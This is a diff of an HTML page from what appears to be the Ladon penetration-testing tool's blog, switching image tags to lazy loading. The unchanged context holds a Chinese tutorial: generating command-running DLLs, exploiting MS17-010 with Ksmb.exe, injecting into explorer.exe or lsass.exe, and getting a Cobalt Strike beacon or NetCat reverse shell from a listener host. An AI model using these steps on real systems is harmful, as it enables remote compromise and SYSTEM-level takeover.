@@ -70,7 +70,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -223,23 +223,23 @@ window.location.href="http://k8gege.org/Ladon/cmddll.html";
 <p>复现0day前，测试是必须的，先保证DLL功能正常，才能拿去复现漏洞，不然你不知道是漏洞的DLL注入或DLL加载器没调好，还是DLL本身有问题，DLL启动参数是任意的，意味着不管漏洞注入导出函数是什么，都能加载，所以我们可用于多个已知漏洞或以后新出的0day漏洞测试。</p>
 <h3 id="GUI用法">GUI用法</h3>
 <p>由于生成DLL都是本地生成，使用CMD版比较麻烦，所以该功能添加到GUI中。用法打开LadonGUI–CmdDll模块，上文本框填写需要执行的CMD命令，CMD执行有两种方式，一是默认的CMD执行，二是PowerShell Base64加密执行，(勾选Base64Cmd),根据需要点击对应系统位数生成DLL。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_calc.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/cmddll_calc.PNG"></p>
 <h4 id="弹计算器演示">弹计算器演示</h4>
 <p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br>
-<img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_calc.gif"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/cmddll_calc.gif"></p>
 <h4 id="MS17010漏洞CS上线演示">MS17010漏洞CS上线演示</h4>
 <p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>
 2 配置好CS监听器，使用“Web Delivery”生成powershell的URL监听<br>
 3 LadonGUI-CmdDLL-CS文本框填写URL，如<a target="_blank" rel="noopener" href="http://192.168.1.108/a%EF%BC%8C%E7%94%9F%E6%88%90x86%E7%9A%84DLL(%E7%9B%AE%E6%A0%8732%E4%BD%8D%E7%B3%BB%E7%BB%9F)">http://192.168.1.108/a，生成x86的DLL(目标32位系统)</a><br>
 4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机并将dll注入explorer.exe,注入explorer进程得到的是当前用户权限，如果注入lsass.exe得到的是system权限，其它进程也是同理，看进程启动所使用的权限，实际测试请根据需要，如遇到不出网的情况，需添加用户注入explorer可能就会失败，因为有些机器开启UAC。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
 <h4 id="MS17010漏洞NC反弹演示">MS17010漏洞NC反弹演示</h4>
 <p>可能有些机器存在杀软查杀CS，导致无法直接上线CS，这时我们可使用NC或MSF上线</p>
 <p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>
 2 打开LadonGui-NetCat-启动监听，默认监听本机4444端口,使用 Ladon web 800 启动WEB，在GUI里填写对应PS1的下载地址，如<a target="_blank" rel="noopener" href="http://192.168.1.108:800/Ladon.ps1%EF%BC%8C%E5%AE%9E%E6%88%98%E8%8B%A5%E6%98%AF%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%85%B6%E5%AE%83powershell%E6%A1%86%E6%9E%B6,%E4%B8%8B%E8%BD%BDexe%E3%80%81dll%E7%AD%89%E6%96%87%E4%BB%B6%E5%9D%87%E5%8F%AF%E4%BD%BF%E7%94%A8Ladon%E7%9A%84web%E6%A8%A1%E5%9D%97%E7%9B%91%E5%90%AC">http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听</a><br>
 3 LadonGUI-CmdDLL-填写IP和端口，生成NC x86的DLL(目标32位系统)<br>
 4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机，成功反弹shell</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
 <p>####　CVE-2021-40444 Office漏洞复现CS上线</p>
 <p><a href="http://k8gege.org/Ladon/CVE-2021-40444.html">http://k8gege.org/Ladon/CVE-2021-40444.html</a></p>
 <h3 id="Ladon下载">Ladon下载</h3>
@@ -248,14 +248,14 @@ window.location.href="http://k8gege.org/Ladon/cmddll.html";
 7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
 8.9版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" class="lazyload" data-src="http://k8gege.org/img/k8team.jpg">
 </div>
 
     </div>
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
